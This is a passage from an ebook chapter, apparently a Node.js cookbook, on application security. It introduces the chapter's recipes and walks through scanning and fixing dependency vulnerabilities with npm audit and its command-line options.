<html><head></head><body>
  <div id="_idContainer052">
   <h1 class="chapter-number" id="_idParaDest-267">
    <a id="_idTextAnchor274">
    </a>
    <span class="koboSpan" id="kobo.1.1">
     9
    </span>
   </h1>
   <h1 id="_idParaDest-268">
    <a id="_idTextAnchor275">
    </a>
    <span class="koboSpan" id="kobo.2.1">
     Dealing with Security
    </span>
   </h1>
   <p>
    <span class="koboSpan" id="kobo.3.1">
     Throughout this book, we’ve learned how we can use Node.js to build applications.
    </span>
    <span class="koboSpan" id="kobo.3.2">
     As with all software, you must take certain precautions to ensure the application you’re building
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.4.1">
      is secure.
     </span>
    </span>
   </p>
   <p>
    <span class="koboSpan" id="kobo.5.1">
     First, you should ensure that you’ve adopted any Node.js releases that contain security fixes.
    </span>
    <span class="koboSpan" id="kobo.5.2">
     For this reason, where possible, you should aim to be on the latest release of a given Node.js
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.6.1">
      release line.
     </span>
    </span>
   </p>
   <p>
    <span class="koboSpan" id="kobo.7.1">
     This chapter will cover some of the key aspects of Node.js web application security.
    </span>
    <span class="koboSpan" id="kobo.7.2">
     The later recipes demonstrate some of the common attacks on web applications, including
    </span>
    <strong class="bold">
     <span class="koboSpan" id="kobo.8.1">
      cross-site scripting
     </span>
    </strong>
    <span class="koboSpan" id="kobo.9.1">
     (
    </span>
    <strong class="bold">
     <span class="koboSpan" id="kobo.10.1">
      XSS
     </span>
    </strong>
    <span class="koboSpan" id="kobo.11.1">
     ) and
    </span>
    <strong class="bold">
     <span class="koboSpan" id="kobo.12.1">
      cross-site request forgery
     </span>
    </strong>
    <span class="koboSpan" id="kobo.13.1">
     (
    </span>
    <strong class="bold">
     <span class="koboSpan" id="kobo.14.1">
      CSRF
     </span>
    </strong>
    <span class="koboSpan" id="kobo.15.1">
     ) attacks.
    </span>
    <span class="koboSpan" id="kobo.15.2">
     They will showcase
    </span>
    <a id="_idIndexMarker674">
    </a>
    <span class="koboSpan" id="kobo.16.1">
     how to
    </span>
    <a id="_idIndexMarker675">
    </a>
    <span class="koboSpan" id="kobo.17.1">
     prevent and mitigate the risk of some of
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.18.1">
      these attacks.
     </span>
    </span>
   </p>
   <p>
    <span class="koboSpan" id="kobo.19.1">
     This chapter will cover the
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.20.1">
      following recipes:
     </span>
    </span>
   </p>
   <ul>
    <li>
     <span class="koboSpan" id="kobo.21.1">
      Detecting
     </span>
     <span class="No-Break">
      <span class="koboSpan" id="kobo.22.1">
       dependency vulnerabilities
      </span>
     </span>
    </li>
    <li>
     <span class="koboSpan" id="kobo.23.1">
      Authentication
     </span>
     <span class="No-Break">
      <span class="koboSpan" id="kobo.24.1">
       with Fastify
      </span>
     </span>
    </li>
    <li>
     <span class="koboSpan" id="kobo.25.1">
      Hardening headers
     </span>
     <span class="No-Break">
      <span class="koboSpan" id="kobo.26.1">
       with Helmet
      </span>
     </span>
    </li>
    <li>
     <span class="koboSpan" id="kobo.27.1">
      Anticipating
     </span>
     <span class="No-Break">
      <span class="koboSpan" id="kobo.28.1">
       malicious input
      </span>
     </span>
    </li>
    <li>
     <span class="koboSpan" id="kobo.29.1">
      Preventing
     </span>
     <span class="No-Break">
      <span class="koboSpan" id="kobo.30.1">
       JSON pollution
      </span>
     </span>
    </li>
    <li>
     <span class="koboSpan" id="kobo.31.1">
      Guarding
     </span>
     <span class="No-Break">
      <span class="koboSpan" id="kobo.32.1">
       against XSS
      </span>
     </span>
    </li>
    <li>
     <span class="No-Break">
      <span class="koboSpan" id="kobo.33.1">
       Preventing CSRF
      </span>
     </span>
    </li>
   </ul>
   <h1 id="_idParaDest-269">
    <a id="_idTextAnchor276">
    </a>
    <span class="koboSpan" id="kobo.34.1">
     Technical requirements
    </span>
   </h1>
   <p>
    <span class="koboSpan" id="kobo.35.1">
     You should have Node.js installed, preferably the latest version of Node.js 22, and access to an editor and browser of
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.36.1">
      your choice.
     </span>
    </span>
   </p>
   <p>
    <span class="koboSpan" id="kobo.37.1">
     Throughout the recipes, we’ll be installing modules from the
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.38.1">
      npm
     </span>
    </strong>
    <span class="koboSpan" id="kobo.39.1">
     registry – therefore, an internet connection will
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.40.1">
      be required.
     </span>
    </span>
   </p>
   <p>
    <span class="koboSpan" id="kobo.41.1">
     The code for the recipes in this chapter is available in this book’s GitHub repository at
    </span>
    <a href="https://github.com/PacktPublishing/Node.js-Cookbook-Fifth-Edition">
     <span class="koboSpan" id="kobo.42.1">
      https://github.com/PacktPublishing/Node.js-Cookbook-Fifth-Edition
     </span>
    </a>
    <span class="koboSpan" id="kobo.43.1">
     , in the
    </span>
    <span class="No-Break">
     <em class="italic">
      <span class="koboSpan" id="kobo.44.1">
       Chapter
      </span>
     </em>
    </span>
    <span class="No-Break">
     <em class="italic">
      <span class="koboSpan" id="kobo.45.1">
       09
      </span>
     </em>
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.46.1">
      directory.
     </span>
    </span>
   </p>
   <h1 id="_idParaDest-270">
    <a id="_idTextAnchor277">
    </a>
    <span class="koboSpan" id="kobo.47.1">
     Detecting dependency vulnerabilities
    </span>
   </h1>
   <p>
    <span class="koboSpan" id="kobo.48.1">
     Throughout this book, we’ve
    </span>
    <a id="_idIndexMarker676">
    </a>
    <span class="koboSpan" id="kobo.49.1">
     leveraged modules from the
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.50.1">
      npm
     </span>
    </strong>
    <span class="koboSpan" id="kobo.51.1">
     registry to form a foundation for the applications we build.
    </span>
    <span class="koboSpan" id="kobo.51.2">
     We’ve learned how the vast module ecosystem enables us to focus on application logic and not have to reinvent common technical
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.52.1">
      solutions repeatedly.
     </span>
    </span>
   </p>
   <p>
    <span class="koboSpan" id="kobo.53.1">
     This ecosystem is key to Node.js’s success.
    </span>
    <span class="koboSpan" id="kobo.53.2">
     However, it does lead to large, nested dependency trees within our applications.
    </span>
    <span class="koboSpan" id="kobo.53.3">
     Not only must we be concerned with the security of the application code that we write ourselves, but we must also consider the security of the code included in the modules in our dependency tree.
    </span>
    <span class="koboSpan" id="kobo.53.4">
     Even the most mature and popular modules and frameworks may contain
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.54.1">
      security vulnerabilities.
     </span>
    </span>
   </p>
   <p>
    <span class="koboSpan" id="kobo.55.1">
     In this recipe, we’ll demonstrate how to detect vulnerabilities in a project’s
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.56.1">
      dependency tree.
     </span>
    </span>
   </p>
   <h2 id="_idParaDest-271">
    <a id="_idTextAnchor278">
    </a>
    <span class="koboSpan" id="kobo.57.1">
     Getting ready
    </span>
   </h2>
   <p>
    <span class="koboSpan" id="kobo.58.1">
     For this recipe, we’ll create a directory named
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.59.1">
      audit-deps
     </span>
    </strong>
    <span class="koboSpan" id="kobo.60.1">
     where we can install some
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.61.1">
      Node.js modules:
     </span>
    </span>
   </p>
   <pre class="console"><span class="koboSpan" id="kobo.62.1">
$ mkdir audit-deps
$ cd audit-deps
$ npm init --yes</span></pre>
   <p>
    <span class="koboSpan" id="kobo.63.1">
     We don’t need to add any further code as we’ll be focusing on learning how to audit the dependencies using
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.64.1">
      the terminal.
     </span>
    </span>
   </p>
   <h2 id="_idParaDest-272">
    <a id="_idTextAnchor279">
    </a>
    <span class="koboSpan" id="kobo.65.1">
     How to do it…
    </span>
   </h2>
   <p>
    <span class="koboSpan" id="kobo.66.1">
     In this recipe, we’ll install some modules from the
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.67.1">
      npm
     </span>
    </strong>
    <span class="koboSpan" id="kobo.68.1">
     registry and scan them
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.69.1">
      for vulnerabilities:
     </span>
    </span>
   </p>
   <ol>
    <li>
     <span class="koboSpan" id="kobo.70.1">
      First, let’s install an old version of the
     </span>
     <strong class="source-inline">
      <span class="koboSpan" id="kobo.71.1">
       express
      </span>
     </strong>
     <span class="koboSpan" id="kobo.72.1">
      module.
     </span>
     <span class="koboSpan" id="kobo.72.2">
      We’ve intentionally chosen an old version with known vulnerabilities to demonstrate how to audit our dependencies.
     </span>
     <span class="koboSpan" id="kobo.72.3">
      This version of Express.js is not recommended for use in
     </span>
     <span class="No-Break">
      <span class="koboSpan" id="kobo.73.1">
       production applications:
      </span>
     </span>
     <pre class="source-code">
<strong class="bold"><span class="koboSpan" id="kobo.74.1">$ npm install express@4.16.0</span></strong>
<strong class="bold"><span class="koboSpan" id="kobo.75.1">added 8 packages, removed 3 packages, changed 14 packages, and audited 52 packages in 674ms</span></strong>
<strong class="bold"><span class="koboSpan" id="kobo.76.1">3 high severity vulnerabilities</span></strong>
<strong class="bold"><span class="koboSpan" id="kobo.77.1">To address all issues, run:</span></strong>
<strong class="bold"><span class="koboSpan" id="kobo.78.1">  npm audit fix</span></strong>
<strong class="bold"><span class="koboSpan" id="kobo.79.1">Run `npm audit` for details.</span></strong></pre>
     <p class="list-inset">
      <span class="koboSpan" id="kobo.80.1">
       Observe that
      </span>
      <a id="_idIndexMarker677">
      </a>
      <span class="koboSpan" id="kobo.81.1">
       the
      </span>
      <strong class="source-inline">
       <span class="koboSpan" id="kobo.82.1">
        npm
       </span>
      </strong>
      <span class="koboSpan" id="kobo.83.1">
       output detects eight known vulnerabilities in this version
      </span>
      <span class="No-Break">
       <span class="koboSpan" id="kobo.84.1">
        of Express.js.
       </span>
      </span>
     </p>
    </li>
    <li>
     <span class="koboSpan" id="kobo.85.1">
      As the output suggests, run the
     </span>
     <strong class="source-inline">
      <span class="koboSpan" id="kobo.86.1">
       $ npm audit
      </span>
     </strong>
     <span class="koboSpan" id="kobo.87.1">
      command for
     </span>
     <span class="No-Break">
      <span class="koboSpan" id="kobo.88.1">
       more details:
      </span>
     </span>
     <pre class="source-code">
<strong class="bold"><span class="koboSpan" id="kobo.89.1">$ npm audit</span></strong></pre>
    </li>
    <li>
     <span class="koboSpan" id="kobo.90.1">
      Observe the output of the
     </span>
     <strong class="source-inline">
      <span class="koboSpan" id="kobo.91.1">
       $ npm audit
      </span>
     </strong>
     <span class="koboSpan" id="kobo.92.1">
      command, as shown in the following screenshot.
     </span>
     <span class="koboSpan" id="kobo.92.2">
      The output lists the individual vulnerabilities, along with
     </span>
     <span class="No-Break">
      <span class="koboSpan" id="kobo.93.1">
       further information:
      </span>
     </span>
    </li>
   </ol>
   <div>
    <div class="IMG---Figure" id="_idContainer039">
     <span class="koboSpan" id="kobo.94.1">
      <img alt="Figure 9.1 – npm audit output for express@4.16.0" src="image/B19212_09_01.jpg"/>
     </span>
    </div>
   </div>
   <p class="IMG---Caption" lang="en-US" xml:lang="en-US">
    <span class="koboSpan" id="kobo.95.1">
     Figure 9.1 – npm audit output for express@4.16.0
    </span>
   </p>
   <ol>
    <li value="4">
     <span class="koboSpan" id="kobo.96.1">
      We can follow the
     </span>
     <a id="_idIndexMarker678">
     </a>
     <span class="koboSpan" id="kobo.97.1">
      GitHub links specified in the console output to navigate to the advisory for the particular vulnerability.
     </span>
     <span class="koboSpan" id="kobo.97.2">
      This will open a web page detailing an overview of the vulnerability and
     </span>
     <span class="No-Break">
      <span class="koboSpan" id="kobo.98.1">
       remediation actions:
      </span>
     </span>
    </li>
   </ol>
   <div>
    <div class="IMG---Figure" id="_idContainer040">
     <span class="koboSpan" id="kobo.99.1">
      <img alt="Figure 9.2 – Example npm vulnerability advisory" src="image/B19212_09_02.jpg"/>
     </span>
    </div>
   </div>
   <p class="IMG---Caption" lang="en-US" xml:lang="en-US">
    <span class="koboSpan" id="kobo.100.1">
     Figure 9.2 – Example npm vulnerability advisory
    </span>
   </p>
   <ol>
    <li value="5">
     <span class="koboSpan" id="kobo.101.1">
      We can try to
     </span>
     <a id="_idIndexMarker679">
     </a>
     <span class="koboSpan" id="kobo.102.1">
      automatically fix the vulnerabilities by using the
     </span>
     <strong class="source-inline">
      <span class="koboSpan" id="kobo.103.1">
       $ npm audit fix
      </span>
     </strong>
     <span class="koboSpan" id="kobo.104.1">
      command.
     </span>
     <span class="koboSpan" id="kobo.104.2">
      This will attempt to update any dependencies to
     </span>
     <span class="No-Break">
      <span class="koboSpan" id="kobo.105.1">
       fixed versions:
      </span>
     </span>
     <pre class="source-code">
<strong class="bold"><span class="koboSpan" id="kobo.106.1">$ npm audit fix</span></strong>
<strong class="bold"><span class="koboSpan" id="kobo.107.1">npm WARN audit-deps@1.0.0 No description</span></strong>
<strong class="bold"><span class="koboSpan" id="kobo.108.1">npm WARN audit-deps@1.0.0 No repository field.</span></strong>
<strong class="bold"><span class="koboSpan" id="kobo.109.1">+ express@4.17.1</span></strong>
<strong class="bold"><span class="koboSpan" id="kobo.110.1">added 8 packages from 10 contributors, removed 4 packages and updated 17 packages in 1.574s</span></strong>
<strong class="bold"><span class="koboSpan" id="kobo.111.1">fixed 9 of 9 vulnerabilities in 46 scanned packages</span></strong></pre>
    </li>
    <li>
     <span class="koboSpan" id="kobo.112.1">
      Now, when we rerun the
     </span>
     <strong class="source-inline">
      <span class="koboSpan" id="kobo.113.1">
       $ npm audit
      </span>
     </strong>
     <span class="koboSpan" id="kobo.114.1">
      command, we’ll get the following output, indicating that there are no longer any known vulnerabilities being detected in our module
     </span>
     <span class="No-Break">
      <span class="koboSpan" id="kobo.115.1">
       dependency tree:
      </span>
     </span>
     <pre class="source-code">
<strong class="bold"><span class="koboSpan" id="kobo.116.1">$ npm audit</span></strong>
<strong class="bold"><span class="koboSpan" id="kobo.117.1">found 0 vulnerabilities</span></strong></pre>
    </li>
   </ol>
   <p>
    <span class="koboSpan" id="kobo.118.1">
     With that, we’ve learned how to use
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.119.1">
      $ npm audit
     </span>
    </strong>
    <span class="koboSpan" id="kobo.120.1">
     to scan for vulnerabilities in
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.121.1">
      our dependencies.
     </span>
    </span>
   </p>
   <h2 id="_idParaDest-273">
    <a id="_idTextAnchor280">
    </a>
    <span class="koboSpan" id="kobo.122.1">
     How it works…
    </span>
   </h2>
   <p>
    <span class="koboSpan" id="kobo.123.1">
     The
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.124.1">
      $ npm audit
     </span>
    </strong>
    <span class="koboSpan" id="kobo.125.1">
     command has been available since
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.126.1">
      npm
     </span>
    </strong>
    <span class="koboSpan" id="kobo.127.1">
     version 6.
    </span>
    <span class="koboSpan" id="kobo.127.2">
     The command submits a report of the dependencies in our application and compares it with a database of known vulnerabilities.
    </span>
    <span class="koboSpan" id="kobo.127.3">
     The
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.128.1">
      $ npm audit
     </span>
    </strong>
    <span class="koboSpan" id="kobo.129.1">
     command will audit direct, development, bundled, and optional dependencies.
    </span>
    <span class="koboSpan" id="kobo.129.2">
     However, it does not audit peer dependencies.
    </span>
    <span class="koboSpan" id="kobo.129.3">
     The command requires both a
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.130.1">
      package.json
     </span>
    </strong>
    <span class="koboSpan" id="kobo.131.1">
     file and a
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.132.1">
      package-lock.json
     </span>
    </strong>
    <span class="koboSpan" id="kobo.133.1">
     file to be present; otherwise, it will fail.
    </span>
    <span class="koboSpan" id="kobo.133.2">
     The audit automatically runs when a package is installed with the
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.134.1">
      $ npm
     </span>
    </strong>
    <span class="No-Break">
     <strong class="source-inline">
      <span class="koboSpan" id="kobo.135.1">
       install
      </span>
     </strong>
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.136.1">
      command.
     </span>
    </span>
   </p>
   <p>
    <span class="koboSpan" id="kobo.137.1">
     Many organizations
    </span>
    <a id="_idIndexMarker680">
    </a>
    <span class="koboSpan" id="kobo.138.1">
     consider
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.139.1">
      $ npm audit
     </span>
    </strong>
    <span class="koboSpan" id="kobo.140.1">
     to be a precautionary measure to protect their applications against known security vulnerabilities.
    </span>
    <span class="koboSpan" id="kobo.140.2">
     For this reason, it is common to add the
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.141.1">
      $ npm audit
     </span>
    </strong>
    <span class="koboSpan" id="kobo.142.1">
     command to
    </span>
    <a id="_idIndexMarker681">
    </a>
    <span class="koboSpan" id="kobo.143.1">
     your
    </span>
    <strong class="bold">
     <span class="koboSpan" id="kobo.144.1">
      continuous integration
     </span>
    </strong>
    <span class="koboSpan" id="kobo.145.1">
     (
    </span>
    <strong class="bold">
     <span class="koboSpan" id="kobo.146.1">
      CI
     </span>
    </strong>
    <span class="koboSpan" id="kobo.147.1">
     ) testing.
    </span>
    <span class="koboSpan" id="kobo.147.2">
     The
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.148.1">
      $ npm audit
     </span>
    </strong>
    <span class="koboSpan" id="kobo.149.1">
     command reports an error code of
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.150.1">
      1
     </span>
    </strong>
    <span class="koboSpan" id="kobo.151.1">
     when a vulnerability is found; this error code can be leveraged to indicate a
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.152.1">
      failed test.
     </span>
    </span>
   </p>
   <p>
    <span class="koboSpan" id="kobo.153.1">
     In this recipe, we used the
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.154.1">
      $ npm audit fix
     </span>
    </strong>
    <span class="koboSpan" id="kobo.155.1">
     command to automatically update our dependencies to fixed versions.
    </span>
    <span class="koboSpan" id="kobo.155.2">
     This command will only upgrade dependencies to later minor or
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.156.1">
      patch versions.
     </span>
    </span>
   </p>
   <p>
    <span class="koboSpan" id="kobo.157.1">
     Should a vulnerability only be fixed in a new major version,
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.158.1">
      npm
     </span>
    </strong>
    <span class="koboSpan" id="kobo.159.1">
     will output a warning indicating the fix is available via
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.160.1">
      npm audit fix --force
     </span>
    </strong>
    <span class="koboSpan" id="kobo.161.1">
     , as shown in the
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.162.1">
      following screenshot:
     </span>
    </span>
   </p>
   <div>
    <div class="IMG---Figure" id="_idContainer041">
     <span class="koboSpan" id="kobo.163.1">
      <img alt="Figure 9.3 – npm audit output showing breaking change resolution" src="image/B19212_09_03.jpg"/>
     </span>
    </div>
   </div>
   <p class="IMG---Caption" lang="en-US" xml:lang="en-US">
    <span class="koboSpan" id="kobo.164.1">
     Figure 9.3 – npm audit output showing breaking change resolution
    </span>
   </p>
   <p>
    <span class="koboSpan" id="kobo.165.1">
     Fixes that require updates to a new major release will not be automatically fixed by the
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.166.1">
      $ npm audit fix
     </span>
    </strong>
    <span class="koboSpan" id="kobo.167.1">
     command as you may need to update your application code to accommodate the breaking change in the dependency.
    </span>
    <span class="koboSpan" id="kobo.167.2">
     It is possible to override this behavior and force
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.168.1">
      npm
     </span>
    </strong>
    <span class="koboSpan" id="kobo.169.1">
     to update all dependencies, even if they include breaking changes, using the
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.170.1">
      $ npm audit fix --force
     </span>
    </strong>
    <span class="koboSpan" id="kobo.171.1">
     command.
    </span>
    <span class="koboSpan" id="kobo.171.2">
     However, in the case of a breaking change, it would be prudent to review the individual module vulnerabilities and manually update the modules one at
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.172.1">
      a time.
     </span>
    </span>
   </p>
   <p>
    <span class="koboSpan" id="kobo.173.1">
     In some cases, a patched
    </span>
    <a id="_idIndexMarker682">
    </a>
    <span class="koboSpan" id="kobo.174.1">
     version of a dependency may not be available.
    </span>
    <span class="koboSpan" id="kobo.174.2">
     In this case,
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.175.1">
      npm
     </span>
    </strong>
    <span class="koboSpan" id="kobo.176.1">
     will inform you that a manual review is required.
    </span>
    <span class="koboSpan" id="kobo.176.2">
     During this manual review, it’s worthwhile trying to determine whether your application is susceptible to the vulnerability.
    </span>
    <span class="koboSpan" id="kobo.176.3">
     Some vulnerabilities will only apply to the use of certain APIs, so if you’re not using those APIs in your application, you may be able to discount the specific vulnerability.
    </span>
    <span class="koboSpan" id="kobo.176.4">
     If the vulnerability applies to your application and there’s no patched version of the dependency available, you should consider patching it within your application’s
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.177.1">
      node_modules
     </span>
    </strong>
    <span class="koboSpan" id="kobo.178.1">
     , if possible.
    </span>
    <span class="koboSpan" id="kobo.178.2">
     A common approach to achieve this is
    </span>
    <a id="_idIndexMarker683">
    </a>
    <span class="koboSpan" id="kobo.179.1">
     using the
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.180.1">
      patch-package
     </span>
    </strong>
    <span class="koboSpan" id="kobo.181.1">
     (
    </span>
    <a href="https://www.npmjs.com/package/patch-package">
     <span class="koboSpan" id="kobo.182.1">
      https://www.npmjs.com/package/patch-package
     </span>
    </a>
    <span class="koboSpan" id="kobo.183.1">
     ) module
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.184.1">
      from
     </span>
    </span>
    <span class="No-Break">
     <strong class="source-inline">
      <span class="koboSpan" id="kobo.185.1">
       npm
      </span>
     </strong>
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.186.1">
      .
     </span>
    </span>
   </p>
   <p class="callout-heading">
    <span class="koboSpan" id="kobo.187.1">
     Important note
    </span>
   </p>
   <p class="callout">
    <span class="koboSpan" id="kobo.188.1">
     In general, it’s worthwhile keeping your application’s dependencies as up-to-date as possible to ensure you have the latest available bugs and security fixes.
    </span>
    <span class="koboSpan" id="kobo.188.2">
     Tools such as
    </span>
    <strong class="bold">
     <span class="koboSpan" id="kobo.189.1">
      Dependabot
     </span>
    </strong>
    <span class="koboSpan" id="kobo.190.1">
     (
    </span>
    <a href="https://dependabot.com/">
     <span class="koboSpan" id="kobo.191.1">
      https://dependabot.com/
     </span>
    </a>
    <span class="koboSpan" id="kobo.192.1">
     ) can help keep your dependencies up to date by
    </span>
    <a id="_idIndexMarker684">
    </a>
    <span class="koboSpan" id="kobo.193.1">
     automating updates
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.194.1">
      on GitHub.
     </span>
    </span>
   </p>
   <p>
    <span class="koboSpan" id="kobo.195.1">
     Note that
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.196.1">
      npm audit
     </span>
    </strong>
    <span class="koboSpan" id="kobo.197.1">
     works by comparing your dependency tree against a database of known vulnerabilities.
    </span>
    <span class="koboSpan" id="kobo.197.2">
     Having
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.198.1">
      npm audit
     </span>
    </strong>
    <span class="koboSpan" id="kobo.199.1">
     return no known vulnerabilities doesn’t mean your dependencies aren’t vulnerable – there could, and likely are, unreported or unknown vulnerabilities in your tree.
    </span>
    <span class="koboSpan" id="kobo.199.2">
     There are also commercial services that provide module dependency vulnerability auditing services.
    </span>
    <span class="koboSpan" id="kobo.199.3">
     Some of these, such as
    </span>
    <strong class="bold">
     <span class="koboSpan" id="kobo.200.1">
      Snyk
     </span>
    </strong>
    <span class="koboSpan" id="kobo.201.1">
     (
    </span>
    <a href="https://snyk.io/">
     <span class="koboSpan" id="kobo.202.1">
      https://snyk.io/
     </span>
    </a>
    <span class="koboSpan" id="kobo.203.1">
     ), maintain
    </span>
    <a id="_idIndexMarker685">
    </a>
    <span class="koboSpan" id="kobo.204.1">
     their own weakness and vulnerability databases, which may contain a different set of known issues to audit your
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.205.1">
      dependencies against.
     </span>
    </span>
   </p>
   <p>
    <span class="koboSpan" id="kobo.206.1">
     There are additional options
    </span>
    <a id="_idIndexMarker686">
    </a>
    <span class="koboSpan" id="kobo.207.1">
     available when using
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.208.1">
      npm audit
     </span>
    </strong>
    <span class="koboSpan" id="kobo.209.1">
     so that you can tailor it to
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.210.1">
      your needs:
     </span>
    </span>
   </p>
   <ul>
    <li>
     <strong class="source-inline">
      <span class="koboSpan" id="kobo.211.1">
       --audit-level &lt;level&gt;
      </span>
     </strong>
     <span class="koboSpan" id="kobo.212.1">
      : Allows you to specify the minimum vulnerability level that
     </span>
     <strong class="source-inline">
      <span class="koboSpan" id="kobo.213.1">
       npm audit
      </span>
     </strong>
     <span class="koboSpan" id="kobo.214.1">
      should report on.
     </span>
     <span class="koboSpan" id="kobo.214.2">
      The levels include
     </span>
     <strong class="source-inline">
      <span class="koboSpan" id="kobo.215.1">
       info
      </span>
     </strong>
     <span class="koboSpan" id="kobo.216.1">
      ,
     </span>
     <strong class="source-inline">
      <span class="koboSpan" id="kobo.217.1">
       low
      </span>
     </strong>
     <span class="koboSpan" id="kobo.218.1">
      ,
     </span>
     <strong class="source-inline">
      <span class="koboSpan" id="kobo.219.1">
       moderate
      </span>
     </strong>
     <span class="koboSpan" id="kobo.220.1">
      ,
     </span>
     <strong class="source-inline">
      <span class="koboSpan" id="kobo.221.1">
       high
      </span>
     </strong>
     <span class="koboSpan" id="kobo.222.1">
      ,
     </span>
     <span class="No-Break">
      <span class="koboSpan" id="kobo.223.1">
       and
      </span>
     </span>
     <span class="No-Break">
      <strong class="source-inline">
       <span class="koboSpan" id="kobo.224.1">
        critical
       </span>
      </strong>
     </span>
     <span class="No-Break">
      <span class="koboSpan" id="kobo.225.1">
       .
      </span>
     </span>
    </li>
    <li>
     <strong class="source-inline">
      <span class="koboSpan" id="kobo.226.1">
       --dry-run
      </span>
     </strong>
     <span class="koboSpan" id="kobo.227.1">
      : Simulates the action of fixing vulnerabilities without applying
     </span>
     <span class="No-Break">
      <span class="koboSpan" id="kobo.228.1">
       any changes.
      </span>
     </span>
    </li>
    <li>
     <strong class="source-inline">
      <span class="koboSpan" id="kobo.229.1">
       --force
      </span>
     </strong>
     <span class="koboSpan" id="kobo.230.1">
      : Forces vulnerable dependencies to be updated, bypassing certain checks such as peer dependency compatibility.
     </span>
     <span class="koboSpan" id="kobo.230.2">
      This option should be used with caution as it can lead to dependency conflicts or introduce breaking changes within
     </span>
     <span class="No-Break">
      <span class="koboSpan" id="kobo.231.1">
       your project.
      </span>
     </span>
    </li>
    <li>
     <strong class="source-inline">
      <span class="koboSpan" id="kobo.232.1">
       --json
      </span>
     </strong>
     <span class="koboSpan" id="kobo.233.1">
      : Outputs the audit results in
     </span>
     <span class="No-Break">
      <span class="koboSpan" id="kobo.234.1">
       JSON format.
      </span>
     </span>
    </li>
    <li>
     <strong class="source-inline">
      <span class="koboSpan" id="kobo.235.1">
       --package-lock-only
      </span>
     </strong>
     <span class="koboSpan" id="kobo.236.1">
      : Restricts the audit to project dependencies defined in the
     </span>
     <strong class="source-inline">
      <span class="koboSpan" id="kobo.237.1">
       package-lock.json
      </span>
     </strong>
     <span class="koboSpan" id="kobo.238.1">
      or
     </span>
     <strong class="source-inline">
      <span class="koboSpan" id="kobo.239.1">
       npm-shrinkwrap.json
      </span>
     </strong>
     <span class="koboSpan" id="kobo.240.1">
      files, without requiring an
     </span>
     <span class="No-Break">
      <span class="koboSpan" id="kobo.241.1">
       actual install.
      </span>
     </span>
    </li>
    <li>
     <strong class="source-inline">
      <span class="koboSpan" id="kobo.242.1">
       --no-package-lock
      </span>
     </strong>
     <span class="koboSpan" id="kobo.243.1">
      : Ignores the project’s
     </span>
     <strong class="source-inline">
      <span class="koboSpan" id="kobo.244.1">
       package-lock.json
      </span>
     </strong>
     <span class="koboSpan" id="kobo.245.1">
      or
     </span>
     <strong class="source-inline">
      <span class="koboSpan" id="kobo.246.1">
       npm-shrinkwrap.json
      </span>
     </strong>
     <span class="koboSpan" id="kobo.247.1">
      files during the audit.
     </span>
     <span class="koboSpan" id="kobo.247.2">
      This can be useful when you want to audit the state of the
     </span>
     <span class="No-Break">
      <strong class="source-inline">
       <span class="koboSpan" id="kobo.248.1">
        node_modules
       </span>
      </strong>
     </span>
     <span class="No-Break">
      <span class="koboSpan" id="kobo.249.1">
       directory.
      </span>
     </span>
    </li>
    <li>
     <strong class="source-inline">
      <span class="koboSpan" id="kobo.250.1">
       --omit
      </span>
     </strong>
     <span class="koboSpan" id="kobo.251.1">
      and
     </span>
     <strong class="source-inline">
      <span class="koboSpan" id="kobo.252.1">
       --include
      </span>
     </strong>
     <span class="koboSpan" id="kobo.253.1">
      : Allow you to configure which types of dependencies (development, optional, or peer dependencies) to exclude or include in the audit
     </span>
     <span class="No-Break">
      <span class="koboSpan" id="kobo.254.1">
